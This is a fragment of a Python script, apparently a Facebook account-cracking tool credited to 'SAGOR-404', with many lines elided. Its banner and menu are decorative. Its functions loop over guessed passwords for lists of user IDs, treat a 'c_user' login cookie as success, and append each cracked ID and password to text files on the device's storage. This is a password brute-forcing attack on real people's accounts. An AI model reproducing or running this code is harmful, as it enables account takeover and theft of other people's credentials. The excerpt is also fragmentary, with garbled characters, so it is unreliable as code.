...
try:
    ...
    exit()
def banner():
    print("[=] ðŸ˜Œ Testing New mathod By S4GOR")
...
#os.system("xdg-open https://github.com/SAGOR-404")
logo=("""\033[92;1m
...
\033[92;1m ▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃
\033[38;5;46m ▊   ‌‌‌‌‌‌                                              ▊
\033[38;5;46m ▊\033[93;1m❥\033[92;1m⋆\033[93;1m❦ \033[97;1m𝐀𝐮𝐭𝐡𝐨𝐫    \033[38;5;196m: \033[1;92mSAGOR-404      \033[38;5;46m                   ▊
\033[38;5;46m ▊\033[93;1m❥\033[92;1m⋆\033[93;1m❦ \033[97;1m𝐅𝐚𝐜𝐞𝐛𝐨𝐨𝐤  \033[38;5;196m: \033[1;92mZUBAIR S4GOR  \033[38;5;46m                    ▊
\033[38;5;46m ▊\033[93;1m❥\033[92;1m⋆\033[93;1m❦ \033[97;1m𝐆𝐢𝐭𝐡𝐮𝐛    \033[38;5;196m: \033[1;92m𝐡𝐭𝐭𝐩𝐬://𝐠𝐢𝐭𝐡𝐮𝐛.𝐜𝐨𝐦/SAGOR-404     \033[38;5;46m ▊
...
def admin():
	...
	bal = input('𝐂𝐡𝐨𝐨𝐬𝐞 > ')
	if bal =='1':
		os.system('xdg-open https://www.facebook.com/sagor.hossen.007?mibextid=ZbWKwL');time.sleep(1)
		admin()
	if bal =='2':
		os.system('xdg-open https://github.com/TOXIC-S4GOR');time.sleep(1)
		admin()
	if bal =='3':
		Main()
def x():
...
def a(uid,pwx,tl):
    ...
    try:
        for ps in pwx:
            ...
            sys.stdout.write(f'\r \033[1;90m[\033[1;93m SAGOR \033[1;90m] \033[1;96m%s/%s\033[1;90m \033[1;90m[\033[1;92mOK:%s\033[1;90m] '%(loop,tl,len(oks))),
            sys.stdout.flush()
            ...
            if 'c_user' in log_cookies:
                ...
                oks.append(cid)
                open('/sdcard/SAGOR-ok.txt', 'a').write(cid+' | '+ps+' | '+uid+'\n')
                break
                ...
                print(f'{W}CP-UA--> {pro}\n ')
                open('/sdcard/SAGOR-CP.txt', 'a').write( uid+' | '+ps+' \n')
                cps.append(uid)
                break
            else:
                continue
        ...
        sys.stdout.write(f" \r{R} [{B} SAGOR{R}]  {P}[{k}{loop}{P}/{h}{len(id)}{P}]Ã¢â‚¬â€{P}[{H}{ok}{P}]Ã¢â‚¬â€{P}[{k}{cp}{x}]Ã¢â‚¬â€[{bo}{'{:.0%}'.format(loop/float(len(id)))}{P}]  ")
        sys.stdout.flush()
    except:
        pass
def b(uid,pwx,tl):
    ...
    try:
        for ps in pwx:
            ...
            if 'c_user' in log_cookies:
                ...
                oks.append(cid)
                open('/sdcard/SAGOR-ok.txt', 'a').write(cid+' | '+ps+'\n')
                break
            else:
                continue
        loop+=1        
